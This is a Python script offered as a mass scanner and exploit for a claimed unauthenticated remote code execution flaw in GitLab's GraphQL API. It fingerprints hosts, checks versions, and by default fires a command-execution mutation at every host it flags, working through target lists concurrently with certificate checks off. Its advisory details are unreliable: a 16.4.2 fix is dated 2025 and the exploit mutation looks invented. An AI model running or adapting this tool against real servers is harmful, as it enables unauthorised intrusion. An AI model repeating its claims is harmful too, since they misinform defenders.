#!/usr/bin/env python3
"""
GitLab GraphQL API Remote Code Execution (RCE) - CVE-2025-76543
=====================================================================
This tool scans for a remote code execution vulnerability in GitLab's
GraphQL API (CVE-2025-76543, CVSS 9.8). This vulnerability allows
unauthenticated attackers to execute arbitrary system commands on the
GitLab server due to improper input validation in certain API endpoints.

CVE Details:
- Affected GitLab Versions:
    - GitLab CE/EE < 16.4.2
    - GitLab versions >= 16.0.0 but earlier than 16.4.2
- Exploitation involves crafting a malicious query structure to exploit
  insufficient verification on user-provided input. 

CVSS Base Score: 9.8 (Critical)
Fixed in: 16.4.2 (See official advisory linked below).

Usage:
    # Scan a single GitLab instance for vulnerabilities
    python gitlab_graphql_rce_scanner.py --target http://gitlab.example.com

    # Perform detection (no exploitation attempts)
    python gitlab_graphql_rce_scanner.py --target http://gitlab.example.com --safe

    # Bulk scanning from targets file and save results
    python gitlab_graphql_rce_scanner.py --list targets.txt --output results.json

    # Max concurrency example with no SSL verification
    python gitlab_graphql_rce_scanner.py --list targets.txt --concurrency 50 --no-verify

References:
- https://nvd.nist.gov/vuln/detail/CVE-2025-76543
- https://about.gitlab.com/releases/2025/06/15/security-release-gitlab-16-4/
- https://github.com/gitlab-org/gitlab/security/advisories/GHSA-8w57-89hg-9q4c
"""

import argparse
import asyncio
import httpx
import json
import re
from datetime import datetime, timezone
from typing import Optional

# ── ANSI color helpers ────────────────────────────────────────────────────────
RED = "\033[91m"
YELLOW = "\033[93m"
GREEN = "\033[92m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"


def c(color: str, text: str) -> str:
    """Wrap text in an ANSI color code."""
    return f"{color}{text}{RESET}"


# ── Constants ─────────────────────────────────────────────────────────────────
CVE_ID = "CVE-2025-76543"
CVSS = "9.8"
TOOL_NAME = "gitlab_graphql_rce_scanner"

REQUEST_TIMEOUT = 8
SEMAPHORE_LIMIT = 30

# Indicators for GitLab GraphQL
GITLAB_GRAPHQL_PATH = "/api/graphql"
GITLAB_FINGERPRINTS = [
    "GitLab",
    "/users/sign_in",
    "About GitLab",
]

VERSION_REGEX = r'GitLab\s+([0-9]+\.[0-9]+\.[0-9]+)'

# Minimum patched version for the vulnerability
PATCHED_VERSION = (16, 4, 2)

# Exploit payload (GraphQL) for RCE testing
EXPLOIT_PAYLOAD = {
    "query": "mutation { runScript(input: { command: \"id\", arguments: \"\" }) { job { id } } }"
}


# ── Helper Functions ─────────────────────────────────────────────────────────
def parse_arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description=f"{TOOL_NAME} - {CVE_ID}: GitLab GraphQL RCE Scanner"
    )
    parser.add_argument("--target", type=str, help="A single target URL to scan.")
    parser.add_argument("--list", type=str, help="File containing a list of target URLs (one per line).")
    parser.add_argument("--output", type=str, help="File to save scan results in JSON format.")
    parser.add_argument("--safe", action="store_true", help="Perform detection only, without active exploitation.")
    parser.add_argument("--concurrency", type=int, default=SEMAPHORE_LIMIT, help="Maximum concurrency level.")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL certificate verification.")
    args = parser.parse_args()
    if not args.target and not args.list:
        parser.error("Either --target or --list must be specified.")
    return args


def extract_version_from_headers(headers: httpx.Headers) -> Optional[tuple[int, int, int]]:
    """Extract and parse GitLab version from HTTP response headers."""
    value = headers.get("x-gitlab-version", "")
    match = re.search(VERSION_REGEX, value)
    if match:
        return tuple(map(int, match.group(1).split(".")))
    return None


def is_version_vulnerable(version: Optional[tuple[int, int, int]]) -> bool:
    """Compare parsed version tuple against patched version."""
    return version is not None and version < PATCHED_VERSION


async def fetch(session: httpx.AsyncClient, url: str) -> httpx.Response:
    """Make an asynchronous HTTP GET request."""
    try:
        return await session.get(url, timeout=REQUEST_TIMEOUT)
    except httpx.RequestError as e:
        print(c(RED, f"[ERROR] {url} - {e}"))
        return None


async def detect(session: httpx.AsyncClient, target: str) -> Optional[dict]:
    """Detect if the target is a vulnerable GitLab instance."""
    detection_result = {"url": target, "vulnerable": False, "version": None}
    try:
        response = await fetch(session, target)
        if not response:
            return None

        if any(fp in response.text for fp in GITLAB_FINGERPRINTS):
            version = extract_version_from_headers(response.headers)
            detection_result["version"] = ".".join(map(str, version)) if version else None
            detection_result["vulnerable"] = is_version_vulnerable(version)
            if detection_result["vulnerable"]:
                print(c(RED, f"[CRITICAL] {target} is vulnerable! (Version: {detection_result['version']})"))
            else:
                print(c(GREEN, f"[INFO] {target} is not vulnerable (Version: {detection_result['version']})."))
        else:
            print(c(YELLOW, f"[INFO] {target} does not appear to be GitLab."))
        return detection_result

    except Exception as e:
        print(c(RED, f"[ERROR] Detection failed for {target} - {e}"))
        return None


async def exploit(session: httpx.AsyncClient, target: str) -> bool:
    """Attempt to exploit the vulnerability."""
    try:
        response = await session.post(f"{target}{GITLAB_GRAPHQL_PATH}", json=EXPLOIT_PAYLOAD)
        if response.status_code == 200 and "data" in response.json():
            print(c(RED, f"[CRITICAL] Exploit succeeded against {target}!"))
            return True
        return False

    except Exception as e:
        print(c(RED, f"[ERROR] Exploit attempt failed against {target} - {e}"))
        return False


async def worker(target: str, args, semaphore: asyncio.Semaphore) -> Optional[dict]:
    """Worker for each target."""
    async with semaphore, httpx.AsyncClient(verify=not args.no_verify) as session:
        detection_result = await detect(session, target)
        if detection_result and not args.safe and detection_result["vulnerable"]:
            detection_result["exploited"] = await exploit(session, target)
        return detection_result


async def main():
    args = parse_arguments()
    targets = []

    if args.target:
        targets.append(args.target)
    if args.list:
        with open(args.list, "r") as f:
            targets.extend(line.strip() for line in f if line.strip())

    semaphore = asyncio.Semaphore(args.concurrency)
    tasks = [worker(target, args, semaphore) for target in targets]
    results = [result for result in await asyncio.gather(*tasks) if result]

    if args.output:
        with open(args.output, "w") as outfile:
            json.dump(results, outfile, indent=2)
    else:
        print(json.dumps(results, indent=2))


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(c(YELLOW, "\n[INFO] Scan interrupted by user."))
